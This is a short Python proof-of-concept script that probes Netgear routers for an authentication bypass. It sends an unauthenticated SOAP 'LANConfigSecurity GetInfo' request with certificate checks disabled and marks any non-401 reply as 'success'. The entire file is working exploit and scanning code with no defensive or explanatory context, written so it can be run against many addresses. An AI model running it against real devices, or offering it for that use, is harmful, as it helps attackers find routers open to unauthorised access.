#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'

import requests

def poc(address):
    url = 'https://{}'.format(address)
    headers = {
        'Soapaction': 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo'
    }
    data = {
        '': ''
    }
    try:
        resp = requests.post(url, verify=False, data=data, headers=headers)
        if resp.status_code != 401:
            return address + '; success'
        else:
            return address + '; ' + str(resp.status_code)
    except requests.RequestException as e:
        return False
    except Exception as e:
        return False